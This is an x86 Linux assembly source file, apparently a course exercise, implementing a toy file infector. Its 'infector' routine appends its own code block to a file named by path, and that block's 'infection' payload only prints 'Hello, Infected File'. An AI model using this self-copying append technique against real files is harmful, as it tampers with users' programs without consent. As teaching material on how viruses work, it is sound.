section .data
infected_str db 'Hello, Infected File',0xA
infected_str_length equ $ - infected_str
section .text
global _start
global system_call
global infector
global infection
extern main

_start:
    pop dword ecx                          ; ecx = argc
    mov esi,esp                            ; esi = argv
    mov eax,ecx                            ; put the number of arguments into eax
    shl eax,2                              ; compute the size of argv in bytes
    add eax,esi                            ; add the size to the address of argv 
    add eax,4                              ; skip NULL at the end of argv
    push dword eax                         ; char *envp[]
    push dword esi                         ; char* argv[]
    push dword ecx                         ; int argc

    call    main                           ; int main( int argc, char *argv[], char *envp[] )

    mov ebx,eax
    mov eax,1
    int 0x80
    nop
        
system_call:
    push ebp                               ; Save caller state
    mov ebp, esp
    sub esp, 4                             ; Leave space for local var on stack
    pushad                                 ; Save some more caller state
           
    mov eax, [ebp+8]                       ; Copy function args to registers: leftmost...        
    mov ebx, [ebp+12]                      ; Next argument...
    mov ecx, [ebp+16]                      ; Next argument...
    mov edx, [ebp+20]                      ; Next argument...
    int 0x80                               ; Transfer control to operating system
    mov [ebp-4], eax                       ; Save returned value...
    popad                                  ; Restore caller state (registers)
    mov eax, [ebp-4]                       ; place returned value where caller can see it
    add esp, 4                             ; Restore caller state
    pop ebp                                ; Restore caller state
    ret                                    ; Back to caller

code_start:
    infection:
        push ebp                           ; Save caller state
        mov ebp, esp
        sub esp, 4                         ; Leave space for local var on stack
        pushad                             ; Save some more caller state

        mov eax, 4                         ; ID code for sys_write
        mov ebx, 1                         ; STDOUT File descriptor
        mov ecx, infected_str              ; count of bytes to send
        mov edx, infected_str_length       ; number of bytes to send

        int 0x80                           ; Transfer control to operating system
        mov [ebp-4], eax                   ; Save returned value.
        popad                              ; Restore caller state (registers)
        mov eax, [ebp-4]                   ; place returned value where caller can see it
        add esp, 4                         ; Restore caller state
        pop ebp                            ; Restore caller state
        ret  
code_end:


    infector:
        push ebp                           ; Save caller state
        mov ebp, esp
        sub esp, 4                         ; Leave space for local var on stack
        pushad                             ; Save some more caller state

        mov eax, 5                         ; ID code for sys_open
        mov ebx, [ebp + 8]                 ; The path name of the file
        mov ecx, 1026                      ; Open for appending to the end of file
        mov edx, 0777                      ; Set file premissions
        int 0x80                           ; Transfer control to operating system
        mov [ebp-4], eax                   ; Get the file descriptor of the file
        
        mov eax, 4                         ; ID code for sys_write
        mov ebx, [ebp-4]                   ; File descriptor
        mov ecx, code_start                ; What to write
        mov edx, code_end                  ; code end address
        sub edx, ecx                       ; calculate how much to write
        int 0x80                           ; Transfer control to operating system
        
        mov eax, 6                         ; ID code for sys_close
        mov ebx, [ebp-4]                   ; File descriptor
        int 0x80                           ; Transfer control to operating system
           
        mov [ebp-4], eax
        popad                              ; Restore caller state (registers)
        mov eax, [ebp-4]                   ; place returned value where caller can see it
        add esp, 4                         ; Restore caller state
        pop ebp                            ; Restore caller state
        ret                                ; Back to caller





    


                    

